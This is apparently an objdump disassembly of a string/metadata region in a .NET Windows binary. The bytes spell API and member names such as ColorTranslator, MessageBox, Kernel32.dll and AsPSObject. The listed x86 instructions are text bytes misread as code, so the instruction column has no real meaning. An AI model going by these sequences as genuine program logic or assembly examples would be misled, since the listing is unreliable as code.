  4080e8:	74 5f                	je     0x408149
  4080ea:	43                   	inc    %ebx
  4080eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4080ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4080ed:	74 72                	je     0x408161
  4080ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4080f0:	6c                   	insb   (%dx),%es:(%edi)
  4080f1:	4b                   	dec    %ebx
  4080f2:	65 79 53             	gs jns 0x408148
  4080f5:	74 61                	je     0x408158
  4080f7:	74 65                	je     0x40815e
  4080f9:	00 67 65             	add    %ah,0x65(%edi)
  4080fc:	74 5f                	je     0x40815d
  4080fe:	43                   	inc    %ebx
  4080ff:	6f                   	outsl  %ds:(%esi),(%dx)
  408100:	6e                   	outsb  %ds:(%esi),(%dx)
  408101:	74 72                	je     0x408175
  408103:	6f                   	outsl  %ds:(%esi),(%dx)
  408104:	6c                   	insb   (%dx),%es:(%edi)
  408105:	4b                   	dec    %ebx
  408106:	65 79 53             	gs jns 0x40815c
  408109:	74 61                	je     0x40816c
  40810b:	74 65                	je     0x408172
  40810d:	00 67 65             	add    %ah,0x65(%edi)
  408110:	74 5f                	je     0x408171
  408112:	4d                   	dec    %ebp
  408113:	6f                   	outsl  %ds:(%esi),(%dx)
  408114:	64 69 66 69 65 72 73 	imul   $0x737265,%fs:0x69(%esi),%esp
  40811b:	00 
  40811c:	67 65 74 5f          	addr16 gs je 0x40817f
  408120:	42                   	inc    %edx
  408121:	6c                   	insb   (%dx),%es:(%edi)
  408122:	61                   	popa
  408123:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408126:	67 65 74 5f          	addr16 gs je 0x408189
  40812a:	42                   	inc    %edx
  40812b:	6c                   	insb   (%dx),%es:(%edi)
  40812c:	75 65                	jne    0x408193
  40812e:	00 67 65             	add    %ah,0x65(%edi)
  408131:	74 5f                	je     0x408192
  408133:	43                   	inc    %ebx
  408134:	79 61                	jns    0x408197
  408136:	6e                   	outsb  %ds:(%esi),(%dx)
  408137:	00 43 6f             	add    %al,0x6f(%ebx)
  40813a:	6c                   	insb   (%dx),%es:(%edi)
  40813b:	6f                   	outsl  %ds:(%esi),(%dx)
  40813c:	72 54                	jb     0x408192
  40813e:	72 61                	jb     0x4081a1
  408140:	6e                   	outsb  %ds:(%esi),(%dx)
  408141:	73 6c                	jae    0x4081af
  408143:	61                   	popa
  408144:	74 6f                	je     0x4081b5
  408146:	72 00                	jb     0x408148
  408148:	46                   	inc    %esi
  408149:	72 6f                	jb     0x4081ba
  40814b:	6d                   	insl   (%dx),%es:(%edi)
  40814c:	48                   	dec    %eax
  40814d:	74 6d                	je     0x4081bc
  40814f:	6c                   	insb   (%dx),%es:(%edi)
  408150:	00 67 65             	add    %ah,0x65(%edi)
  408153:	74 5f                	je     0x4081b4
  408155:	4d                   	dec    %ebp
  408156:	61                   	popa
  408157:	67 65 6e             	outsb  %gs:(%si),(%dx)
  40815a:	74 61                	je     0x4081bd
  40815c:	00 67 65             	add    %ah,0x65(%edi)
  40815f:	74 5f                	je     0x4081c0
  408161:	52                   	push   %edx
  408162:	65 64 00 67 65       	gs add %ah,%fs:0x65(%edi)
  408167:	74 5f                	je     0x4081c8
  408169:	57                   	push   %edi
  40816a:	68 69 74 65 00       	push   $0x657469
  40816f:	67 65 74 5f          	addr16 gs je 0x4081d2
  408173:	59                   	pop    %ecx
  408174:	65 6c                	gs insb (%dx),%es:(%edi)
  408176:	6c                   	insb   (%dx),%es:(%edi)
  408177:	6f                   	outsl  %ds:(%esi),(%dx)
  408178:	77 00                	ja     0x40817a
  40817a:	53                   	push   %ebx
  40817b:	75 73                	jne    0x4081f0
  40817d:	70 65                	jo     0x4081e4
  40817f:	6e                   	outsb  %ds:(%esi),(%dx)
  408180:	64 4c                	fs dec %esp
  408182:	61                   	popa
  408183:	79 6f                	jns    0x4081f4
  408185:	75 74                	jne    0x4081fb
  408187:	00 53 63             	add    %dl,0x63(%ebx)
  40818a:	72 6f                	jb     0x4081fb
  40818c:	6c                   	insb   (%dx),%es:(%edi)
  40818d:	6c                   	insb   (%dx),%es:(%edi)
  40818e:	61                   	popa
  40818f:	62 6c 65 43          	bound  %ebp,0x43(%ebp,%eiz,2)
  408193:	6f                   	outsl  %ds:(%esi),(%dx)
  408194:	6e                   	outsb  %ds:(%esi),(%dx)
  408195:	74 72                	je     0x408209
  408197:	6f                   	outsl  %ds:(%esi),(%dx)
  408198:	6c                   	insb   (%dx),%es:(%edi)
  408199:	00 73 65             	add    %dh,0x65(%ebx)
  40819c:	74 5f                	je     0x4081fd
  40819e:	41                   	inc    %ecx
  40819f:	75 74                	jne    0x408215
  4081a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4081a2:	53                   	push   %ebx
  4081a3:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4081a6:	6c                   	insb   (%dx),%es:(%edi)
  4081a7:	6c                   	insb   (%dx),%es:(%edi)
  4081a8:	00 73 65             	add    %dh,0x65(%ebx)
  4081ab:	74 5f                	je     0x40820c
  4081ad:	42                   	inc    %edx
  4081ae:	61                   	popa
  4081af:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  4081b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4081b3:	6c                   	insb   (%dx),%es:(%edi)
  4081b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4081b5:	72 00                	jb     0x4081b7
  4081b7:	73 65                	jae    0x40821e
  4081b9:	74 5f                	je     0x40821a
  4081bb:	43                   	inc    %ebx
  4081bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4081bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4081be:	74 72                	je     0x408232
  4081c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c1:	6c                   	insb   (%dx),%es:(%edi)
  4081c2:	42                   	inc    %edx
  4081c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c4:	78 00                	js     0x4081c6
  4081c6:	52                   	push   %edx
  4081c7:	65 73 75             	gs jae 0x40823f
  4081ca:	6d                   	insl   (%dx),%es:(%edi)
  4081cb:	65 4c                	gs dec %esp
  4081cd:	61                   	popa
  4081ce:	79 6f                	jns    0x40823f
  4081d0:	75 74                	jne    0x408246
  4081d2:	00 45 6c             	add    %al,0x6c(%ebp)
  4081d5:	61                   	popa
  4081d6:	70 73                	jo     0x40824b
  4081d8:	65 64 45             	gs fs inc %ebp
  4081db:	76 65                	jbe    0x408242
  4081dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4081de:	74 48                	je     0x408228
  4081e0:	61                   	popa
  4081e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4081e2:	64 6c                	fs insb (%dx),%es:(%edi)
  4081e4:	65 72 00             	gs jb  0x4081e7
  4081e7:	61                   	popa
  4081e8:	64 64 5f             	fs fs pop %edi
  4081eb:	45                   	inc    %ebp
  4081ec:	6c                   	insb   (%dx),%es:(%edi)
  4081ed:	61                   	popa
  4081ee:	70 73                	jo     0x408263
  4081f0:	65 64 00 73 65       	gs add %dh,%fs:0x65(%ebx)
  4081f5:	74 5f                	je     0x408256
  4081f7:	49                   	dec    %ecx
  4081f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4081f9:	74 65                	je     0x408260
  4081fb:	72 76                	jb     0x408273
  4081fd:	61                   	popa
  4081fe:	6c                   	insb   (%dx),%es:(%edi)
  4081ff:	00 73 65             	add    %dh,0x65(%ebx)
  408202:	74 5f                	je     0x408263
  408204:	41                   	inc    %ecx
  408205:	75 74                	jne    0x40827b
  408207:	6f                   	outsl  %ds:(%esi),(%dx)
  408208:	52                   	push   %edx
  408209:	65 73 65             	gs jae 0x408271
  40820c:	74 00                	je     0x40820e
  40820e:	53                   	push   %ebx
  40820f:	74 61                	je     0x408272
  408211:	72 74                	jb     0x408287
  408213:	00 67 65             	add    %ah,0x65(%edi)
  408216:	74 5f                	je     0x408277
  408218:	49                   	dec    %ecx
  408219:	74 65                	je     0x408280
  40821b:	6d                   	insl   (%dx),%es:(%edi)
  40821c:	00 73 65             	add    %dh,0x65(%ebx)
  40821f:	74 5f                	je     0x408280
  408221:	56                   	push   %esi
  408222:	61                   	popa
  408223:	6c                   	insb   (%dx),%es:(%edi)
  408224:	75 65                	jne    0x40828b
  408226:	00 52 65             	add    %dl,0x65(%edx)
  408229:	66 72 65             	data16 jb 0x408291
  40822c:	73 68                	jae    0x408296
  40822e:	00 73 65             	add    %dh,0x65(%ebx)
  408231:	74 5f                	je     0x408292
  408233:	4c                   	dec    %esp
  408234:	65 66 74 00          	gs data16 je 0x408238
  408238:	73 65                	jae    0x40829f
  40823a:	74 5f                	je     0x40829b
  40823c:	54                   	push   %esp
  40823d:	6f                   	outsl  %ds:(%esi),(%dx)
  40823e:	70 00                	jo     0x408240
  408240:	46                   	inc    %esi
  408241:	6f                   	outsl  %ds:(%esi),(%dx)
  408242:	6e                   	outsb  %ds:(%esi),(%dx)
  408243:	74 00                	je     0x408245
  408245:	67 65 74 5f          	addr16 gs je 0x4082a8
  408249:	46                   	inc    %esi
  40824a:	6f                   	outsl  %ds:(%esi),(%dx)
  40824b:	6e                   	outsb  %ds:(%esi),(%dx)
  40824c:	74 00                	je     0x40824e
  40824e:	46                   	inc    %esi
  40824f:	6f                   	outsl  %ds:(%esi),(%dx)
  408250:	6e                   	outsb  %ds:(%esi),(%dx)
  408251:	74 53                	je     0x4082a6
  408253:	74 79                	je     0x4082ce
  408255:	6c                   	insb   (%dx),%es:(%edi)
  408256:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40825a:	74 5f                	je     0x4082bb
  40825c:	46                   	inc    %esi
  40825d:	6f                   	outsl  %ds:(%esi),(%dx)
  40825e:	6e                   	outsb  %ds:(%esi),(%dx)
  40825f:	74 00                	je     0x408261
  408261:	50                   	push   %eax
  408262:	72 6f                	jb     0x4082d3
  408264:	67 72 65             	addr16 jb 0x4082cc
  408267:	73 73                	jae    0x4082dc
  408269:	42                   	inc    %edx
  40826a:	61                   	popa
  40826b:	72 53                	jb     0x4082c0
  40826d:	74 79                	je     0x4082e8
  40826f:	6c                   	insb   (%dx),%es:(%edi)
  408270:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408274:	74 5f                	je     0x4082d5
  408276:	53                   	push   %ebx
  408277:	74 79                	je     0x4082f2
  408279:	6c                   	insb   (%dx),%es:(%edi)
  40827a:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40827e:	74 5f                	je     0x4082df
  408280:	46                   	inc    %esi
  408281:	6f                   	outsl  %ds:(%esi),(%dx)
  408282:	72 65                	jb     0x4082e9
  408284:	43                   	inc    %ebx
  408285:	6f                   	outsl  %ds:(%esi),(%dx)
  408286:	6c                   	insb   (%dx),%es:(%edi)
  408287:	6f                   	outsl  %ds:(%esi),(%dx)
  408288:	72 00                	jb     0x40828a
  40828a:	73 65                	jae    0x4082f1
  40828c:	74 5f                	je     0x4082ed
  40828e:	53                   	push   %ebx
  40828f:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408296:	5f                   	pop    %edi
  408297:	41                   	inc    %ecx
  408298:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40829c:	69 74 79 49 64 00 50 	imul   $0x72500064,0x49(%ecx,%edi,2),%esi
  4082a3:	72 
  4082a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4082a5:	67 72 65             	addr16 jb 0x40830d
  4082a8:	73 73                	jae    0x40831d
  4082aa:	52                   	push   %edx
  4082ab:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  4082af:	64 54                	fs push %esp
  4082b1:	79 70                	jns    0x408323
  4082b3:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4082b7:	74 5f                	je     0x408318
  4082b9:	52                   	push   %edx
  4082ba:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  4082be:	64 54                	fs push %esp
  4082c0:	79 70                	jns    0x408332
  4082c2:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4082c6:	6d                   	insl   (%dx),%es:(%edi)
  4082c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4082c8:	76 65                	jbe    0x40832f
  4082ca:	00 53 79             	add    %dl,0x79(%ebx)
  4082cd:	73 74                	jae    0x408343
  4082cf:	65 6d                	gs insl (%dx),%es:(%edi)
  4082d1:	2e 43                	cs inc %ebx
  4082d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4082d4:	6d                   	insl   (%dx),%es:(%edi)
  4082d5:	70 6f                	jo     0x408346
  4082d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4082d8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4082da:	74 4d                	je     0x408329
  4082dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4082dd:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  4082e0:	00 43 6f             	add    %al,0x6f(%ebx)
  4082e3:	6d                   	insl   (%dx),%es:(%edi)
  4082e4:	70 6f                	jo     0x408355
  4082e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4082e7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4082e9:	74 00                	je     0x4082eb
  4082eb:	52                   	push   %edx
  4082ec:	65 6d                	gs insl (%dx),%es:(%edi)
  4082ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4082ef:	76 65                	jbe    0x408356
  4082f1:	41                   	inc    %ecx
  4082f2:	74 00                	je     0x4082f4
  4082f4:	53                   	push   %ebx
  4082f5:	74 6f                	je     0x408366
  4082f7:	70 00                	jo     0x4082f9
  4082f9:	67 65 74 5f          	addr16 gs je 0x40835c
  4082fd:	50                   	push   %eax
  4082fe:	61                   	popa
  4082ff:	72 65                	jb     0x408366
  408301:	6e                   	outsb  %ds:(%esi),(%dx)
  408302:	74 41                	je     0x408345
  408304:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408308:	69 74 79 49 64 00 49 	imul   $0x6e490064,0x49(%ecx,%edi,2),%esi
  40830f:	6e 
  408310:	73 65                	jae    0x408377
  408312:	72 74                	jb     0x408388
  408314:	00 67 65             	add    %ah,0x65(%edi)
  408317:	74 5f                	je     0x408378
  408319:	41                   	inc    %ecx
  40831a:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40831e:	69 74 79 00 67 65 74 	imul   $0x5f746567,0x0(%ecx,%edi,2),%esi
  408325:	5f 
  408326:	53                   	push   %ebx
  408327:	74 61                	je     0x40838a
  408329:	74 75                	je     0x4083a0
  40832b:	73 44                	jae    0x408371
  40832d:	65 73 63             	gs jae 0x408393
  408330:	72 69                	jb     0x40839b
  408332:	70 74                	jo     0x4083a8
  408334:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  40833b:	5f                   	pop    %edi
  40833c:	50                   	push   %eax
  40833d:	65 72 63             	gs jb  0x4083a3
  408340:	65 6e                	outsb  %gs:(%esi),(%dx)
  408342:	74 43                	je     0x408387
  408344:	6f                   	outsl  %ds:(%esi),(%dx)
  408345:	6d                   	insl   (%dx),%es:(%edi)
  408346:	70 6c                	jo     0x4083b4
  408348:	65 74 65             	gs je  0x4083b0
  40834b:	00 67 65             	add    %ah,0x65(%edi)
  40834e:	74 5f                	je     0x4083af
  408350:	53                   	push   %ebx
  408351:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  408355:	64 73 52             	fs jae 0x4083aa
  408358:	65 6d                	gs insl (%dx),%es:(%edi)
  40835a:	61                   	popa
  40835b:	69 6e 69 6e 67 00 54 	imul   $0x5400676e,0x69(%esi),%ebp
  408362:	69 6d 65 53 70 61 6e 	imul   $0x6e617053,0x65(%ebp),%ebp
  408369:	00 67 65             	add    %ah,0x65(%edi)
  40836c:	74 5f                	je     0x4083cd
  40836e:	54                   	push   %esp
  40836f:	6f                   	outsl  %ds:(%esi),(%dx)
  408370:	74 61                	je     0x4083d3
  408372:	6c                   	insb   (%dx),%es:(%edi)
  408373:	48                   	dec    %eax
  408374:	6f                   	outsl  %ds:(%esi),(%dx)
  408375:	75 72                	jne    0x4083e9
  408377:	73 00                	jae    0x408379
  408379:	49                   	dec    %ecx
  40837a:	6e                   	outsb  %ds:(%esi),(%dx)
  40837b:	74 33                	je     0x4083b0
  40837d:	32 00                	xor    (%eax),%al
  40837f:	67 65 74 5f          	addr16 gs je 0x4083e2
  408383:	4d                   	dec    %ebp
  408384:	69 6e 75 74 65 73 00 	imul   $0x736574,0x75(%esi),%ebp
  40838b:	67 65 74 5f          	addr16 gs je 0x4083ee
  40838f:	53                   	push   %ebx
  408390:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  408394:	64 73 00             	fs jae 0x408397
  408397:	46                   	inc    %esi
  408398:	6f                   	outsl  %ds:(%esi),(%dx)
  408399:	72 6d                	jb     0x408408
  40839b:	61                   	popa
  40839c:	74 00                	je     0x40839e
  40839e:	43                   	inc    %ebx
  40839f:	6f                   	outsl  %ds:(%esi),(%dx)
  4083a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4083a1:	63 61 74             	arpl   %esp,0x74(%ecx)
  4083a4:	00 67 65             	add    %ah,0x65(%edi)
  4083a7:	74 5f                	je     0x408408
  4083a9:	43                   	inc    %ebx
  4083aa:	75 72                	jne    0x40841e
  4083ac:	72 65                	jb     0x408413
  4083ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4083af:	74 4f                	je     0x408400
  4083b1:	70 65                	jo     0x408418
  4083b3:	72 61                	jb     0x408416
  4083b5:	74 69                	je     0x408420
  4083b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4083b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4083b9:	00 41 70             	add    %al,0x70(%ecx)
  4083bc:	70 6c                	jo     0x40842a
  4083be:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4083c5:	00 44 6f 45          	add    %al,0x45(%edi,%ebp,2)
  4083c9:	76 65                	jbe    0x408430
  4083cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4083cc:	74 73                	je     0x408441
  4083ce:	00 4b 65             	add    %cl,0x65(%ebx)
  4083d1:	72 6e                	jb     0x408441
  4083d3:	65 6c                	gs insb (%dx),%es:(%edi)
  4083d5:	33 32                	xor    (%edx),%esi
  4083d7:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4083da:	6c                   	insb   (%dx),%es:(%edi)
  4083db:	00 4d 65             	add    %cl,0x65(%ebp)
  4083de:	73 73                	jae    0x408453
  4083e0:	61                   	popa
  4083e1:	67 65 42             	addr16 gs inc %edx
  4083e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4083e5:	78 00                	js     0x4083e7
  4083e7:	67 65 74 5f          	addr16 gs je 0x40844a
  4083eb:	50                   	push   %eax
  4083ec:	61                   	popa
  4083ed:	72 61                	jb     0x408450
  4083ef:	6d                   	insl   (%dx),%es:(%edi)
  4083f0:	65 74 65             	gs je  0x408458
  4083f3:	72 41                	jb     0x408436
  4083f5:	73 73                	jae    0x40846a
  4083f7:	65 6d                	gs insl (%dx),%es:(%edi)
  4083f9:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4083fd:	75 6c                	jne    0x40846b
  4083ff:	6c                   	insb   (%dx),%es:(%edi)
  408400:	4e                   	dec    %esi
  408401:	61                   	popa
  408402:	6d                   	insl   (%dx),%es:(%edi)
  408403:	65 00 54 79 70       	add    %dl,%gs:0x70(%ecx,%edi,2)
  408408:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40840c:	6e                   	outsb  %ds:(%esi),(%dx)
  40840d:	74 69                	je     0x408478
  40840f:	6d                   	insl   (%dx),%es:(%edi)
  408410:	65 54                	gs push %esp
  408412:	79 70                	jns    0x408484
  408414:	65 48                	gs dec %eax
  408416:	61                   	popa
  408417:	6e                   	outsb  %ds:(%esi),(%dx)
  408418:	64 6c                	fs insb (%dx),%es:(%edi)
  40841a:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40841e:	74 54                	je     0x408474
  408420:	79 70                	jns    0x408492
  408422:	65 46                	gs inc %esi
  408424:	72 6f                	jb     0x408495
  408426:	6d                   	insl   (%dx),%es:(%edi)
  408427:	48                   	dec    %eax
  408428:	61                   	popa
  408429:	6e                   	outsb  %ds:(%esi),(%dx)
  40842a:	64 6c                	fs insb (%dx),%es:(%edi)
  40842c:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408430:	74 54                	je     0x408486
  408432:	79 70                	jns    0x4084a4
  408434:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408438:	74 5f                	je     0x408499
  40843a:	49                   	dec    %ecx
  40843b:	73 41                	jae    0x40847e
  40843d:	72 72                	jb     0x4084b1
  40843f:	61                   	popa
  408440:	79 00                	jns    0x408442
  408442:	47                   	inc    %edi
  408443:	65 74 45             	gs je  0x40848b
  408446:	6c                   	insb   (%dx),%es:(%edi)
  408447:	65 6d                	gs insl (%dx),%es:(%edi)
  408449:	65 6e                	outsb  %gs:(%esi),(%dx)
  40844b:	74 54                	je     0x4084a1
  40844d:	79 70                	jns    0x4084bf
  40844f:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  408453:	61                   	popa
  408454:	72 00                	jb     0x408456
  408456:	4d                   	dec    %ebp
  408457:	61                   	popa
  408458:	6b 65 47 65          	imul   $0x65,0x47(%ebp),%esp
  40845c:	6e                   	outsb  %ds:(%esi),(%dx)
  40845d:	65 72 69             	gs jb  0x4084c9
  408460:	63 54 79 70          	arpl   %edx,0x70(%ecx,%edi,2)
  408464:	65 00 45 6d          	add    %al,%gs:0x6d(%ebp)
  408468:	70 74                	jo     0x4084de
  40846a:	79 54                	jns    0x4084c0
  40846c:	79 70                	jns    0x4084de
  40846e:	65 73 00             	gs jae 0x408471
  408471:	43                   	inc    %ebx
  408472:	6f                   	outsl  %ds:(%esi),(%dx)
  408473:	6e                   	outsb  %ds:(%esi),(%dx)
  408474:	73 74                	jae    0x4084ea
  408476:	72 75                	jb     0x4084ed
  408478:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  40847c:	49                   	dec    %ecx
  40847d:	6e                   	outsb  %ds:(%esi),(%dx)
  40847e:	66 6f                	outsw  %ds:(%esi),(%dx)
  408480:	00 42 69             	add    %al,0x69(%edx)
  408483:	6e                   	outsb  %ds:(%esi),(%dx)
  408484:	64 69 6e 67 46 6c 61 	imul   $0x67616c46,%fs:0x67(%esi),%ebp
  40848b:	67 
  40848c:	73 00                	jae    0x40848e
  40848e:	42                   	inc    %edx
  40848f:	69 6e 64 65 72 00 50 	imul   $0x50007265,0x64(%esi),%ebp
  408496:	61                   	popa
  408497:	72 61                	jb     0x4084fa
  408499:	6d                   	insl   (%dx),%es:(%edi)
  40849a:	65 74 65             	gs je  0x408502
  40849d:	72 4d                	jb     0x4084ec
  40849f:	6f                   	outsl  %ds:(%esi),(%dx)
  4084a0:	64 69 66 69 65 72 00 	imul   $0x47007265,%fs:0x69(%esi),%esp
  4084a7:	47 
  4084a8:	65 74 43             	gs je  0x4084ee
  4084ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4084ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4084ad:	73 74                	jae    0x408523
  4084af:	72 75                	jb     0x408526
  4084b1:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  4084b5:	00 49 6e             	add    %cl,0x6e(%ecx)
  4084b8:	76 6f                	jbe    0x408529
  4084ba:	6b 65 00 43          	imul   $0x43,0x0(%ebp),%esp
  4084be:	6f                   	outsl  %ds:(%esi),(%dx)
  4084bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4084c0:	76 65                	jbe    0x408527
  4084c2:	72 74                	jb     0x408538
  4084c4:	00 43 68             	add    %al,0x68(%ebx)
  4084c7:	61                   	popa
  4084c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4084c9:	67 65 54             	addr16 gs push %esp
  4084cc:	79 70                	jns    0x40853e
  4084ce:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  4084d2:	76 6f                	jbe    0x408543
  4084d4:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  4084d8:	6d                   	insl   (%dx),%es:(%edi)
  4084d9:	62 65 72             	bound  %esp,0x72(%ebp)
  4084dc:	00 41 72             	add    %al,0x72(%ecx)
  4084df:	72 61                	jb     0x408542
  4084e1:	79 00                	jns    0x4084e3
  4084e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4084e4:	70 5f                	jo     0x408545
  4084e6:	49                   	dec    %ecx
  4084e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4084e8:	65 71 75             	gs jno 0x408560
  4084eb:	61                   	popa
  4084ec:	6c                   	insb   (%dx),%es:(%edi)
  4084ed:	69 74 79 00 6f 70 5f 	imul   $0x455f706f,0x0(%ecx,%edi,2),%esi
  4084f4:	45 
  4084f5:	71 75                	jno    0x40856c
  4084f7:	61                   	popa
  4084f8:	6c                   	insb   (%dx),%es:(%edi)
  4084f9:	69 74 79 00 67 65 74 	imul   $0x5f746567,0x0(%ecx,%edi,2),%esi
  408500:	5f 
  408501:	44                   	inc    %esp
  408502:	65 66 61             	gs popaw
  408505:	75 6c                	jne    0x408573
  408507:	74 56                	je     0x40855f
  408509:	61                   	popa
  40850a:	6c                   	insb   (%dx),%es:(%edi)
  40850b:	75 65                	jne    0x408572
  40850d:	00 45 78             	add    %al,0x78(%ebp)
  408510:	63 65 70             	arpl   %esp,0x70(%ebp)
  408513:	74 69                	je     0x40857e
  408515:	6f                   	outsl  %ds:(%esi),(%dx)
  408516:	6e                   	outsb  %ds:(%esi),(%dx)
  408517:	00 54 6f 43          	add    %dl,0x43(%edi,%ebp,2)
  40851b:	68 61 72 41 72       	push   $0x72417261
  408520:	72 61                	jb     0x408583
  408522:	79 00                	jns    0x408524
  408524:	41                   	inc    %ecx
  408525:	70 70                	jo     0x408597
  408527:	65 6e                	outsb  %gs:(%esi),(%dx)
  408529:	64 43                	fs inc %ebx
  40852b:	68 61 72 00 43       	push   $0x43007261
  408530:	6f                   	outsl  %ds:(%esi),(%dx)
  408531:	6e                   	outsb  %ds:(%esi),(%dx)
  408532:	73 6f                	jae    0x4085a3
  408534:	6c                   	insb   (%dx),%es:(%edi)
  408535:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408539:	6e                   	outsb  %ds:(%esi),(%dx)
  40853a:	73 6f                	jae    0x4085ab
  40853c:	6c                   	insb   (%dx),%es:(%edi)
  40853d:	65 4b                	gs dec %ebx
  40853f:	65 79 49             	gs jns 0x40858b
  408542:	6e                   	outsb  %ds:(%esi),(%dx)
  408543:	66 6f                	outsw  %ds:(%esi),(%dx)
  408545:	00 43 6f             	add    %al,0x6f(%ebx)
  408548:	6e                   	outsb  %ds:(%esi),(%dx)
  408549:	73 6f                	jae    0x4085ba
  40854b:	6c                   	insb   (%dx),%es:(%edi)
  40854c:	65 4b                	gs dec %ebx
  40854e:	65 79 00             	gs jns 0x408551
  408551:	67 65 74 5f          	addr16 gs je 0x4085b4
  408555:	4b                   	dec    %ebx
  408556:	65 79 00             	gs jns 0x408559
  408559:	67 65 74 5f          	addr16 gs je 0x4085bc
  40855d:	4c                   	dec    %esp
  40855e:	65 6e                	outsb  %gs:(%esi),(%dx)
  408560:	67 74 68             	addr16 je 0x4085cb
  408563:	00 67 65             	add    %ah,0x65(%edi)
  408566:	74 5f                	je     0x4085c7
  408568:	4b                   	dec    %ebx
  408569:	65 79 43             	gs jns 0x4085af
  40856c:	68 61 72 00 53       	push   $0x53007261
  408571:	79 73                	jns    0x4085e6
  408573:	74 65                	je     0x4085da
  408575:	6d                   	insl   (%dx),%es:(%edi)
  408576:	2e 54                	cs push %esp
  408578:	68 72 65 61 64       	push   $0x64616572
  40857d:	69 6e 67 00 54 68 72 	imul   $0x72685400,0x67(%esi),%ebp
  408584:	65 61                	gs popa
  408586:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40858a:	74 5f                	je     0x4085eb
  40858c:	43                   	inc    %ebx
  40858d:	75 72                	jne    0x408601
  40858f:	72 65                	jb     0x4085f6
  408591:	6e                   	outsb  %ds:(%esi),(%dx)
  408592:	74 54                	je     0x4085e8
  408594:	68 72 65 61 64       	push   $0x64616572
  408599:	00 4e 65             	add    %cl,0x65(%esi)
  40859c:	77 47                	ja     0x4085e5
  40859e:	75 69                	jne    0x408609
  4085a0:	64 00 41 73          	add    %al,%fs:0x73(%ecx)
  4085a4:	50                   	push   %eax
  4085a5:	53                   	push   %ebx
  4085a6:	4f                   	dec    %edi
  4085a7:	62 6a 65             	bound  %ebp,0x65(%edx)
  4085aa:	63 74 00 41          	arpl   %esi,0x41(%eax,%eax,1)
  4085ae:	72 67                	jb     0x408617
  4085b0:	75 6d                	jne    0x40861f
  4085b2:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085b4:	74 4e                	je     0x408604
  4085b6:	75 6c                	jne    0x408624
  4085b8:	6c                   	insb   (%dx),%es:(%edi)
  4085b9:	45                   	inc    %ebp
  4085ba:	78 63                	js     0x40861f
  4085bc:	65 70 74             	gs jo  0x408633
  4085bf:	69 6f 6e 00 53 54 41 	imul   $0x41545300,0x6e(%edi),%ebp
  4085c6:	54                   	push   %esp
  4085c7:	68 72 65 61 64       	push   $0x64616572
  4085cc:	41                   	inc    %ecx
  4085cd:	74 74                	je     0x408643
  4085cf:	72 69                	jb     0x40863a
  4085d1:	62 75 74             	bound  %esi,0x74(%ebp)
  4085d4:	65 00 3c 3e          	add    %bh,%gs:(%esi,%edi,1)
  4085d8:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  4085db:	44                   	inc    %esp
